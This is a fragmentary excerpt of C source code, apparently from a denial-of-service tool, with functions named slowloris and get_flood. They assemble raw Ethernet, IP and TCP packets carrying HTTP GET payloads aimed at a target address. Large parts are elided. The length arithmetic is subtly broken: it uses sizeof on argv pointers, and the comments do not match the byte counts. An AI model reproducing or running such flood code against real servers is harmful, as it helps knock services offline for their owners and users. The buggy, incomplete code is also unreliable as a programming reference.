...
void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    ...
    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 37 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    //uint8_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    uint16_t data_len = /*strlen?*/sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    char *pkt_data = 0;
...
void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    ...
    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    uint16_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    char *pkt_data;
    pkt_data = (char *) malloc(data_len);
    if(pkt_data == NULL)
    {
    ...
    iph.ip_src.s_addr = *source_ip;
    iph.ip_dst.s_addr = *dst_ip;
    iph.ip_sum = chksum((unsigned short *) packet, sizeof(struct ip)); //pkt_data, iph.ip_len >> 1
